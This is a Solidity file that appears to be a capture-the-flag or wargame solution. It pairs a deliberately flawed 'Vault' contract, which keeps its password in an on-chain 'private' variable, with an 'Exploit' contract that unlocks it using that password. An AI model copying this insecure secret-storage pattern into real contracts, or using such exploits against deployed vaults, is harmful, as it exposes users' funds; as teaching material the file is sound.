// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "exploit_templates/Destructible.sol";
import "exploit_templates/Targeted.sol";


contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}

contract Exploit is Destructible, Targeted {
  bytes32 public password;
  constructor(address target_addr, bytes32 _password) payable Targeted(target_addr) {
    password = _password;
  }

  function exploit() public payable {
    Vault vault = Vault(Targeted(this).target());
    vault.unlock(password);
  }
}

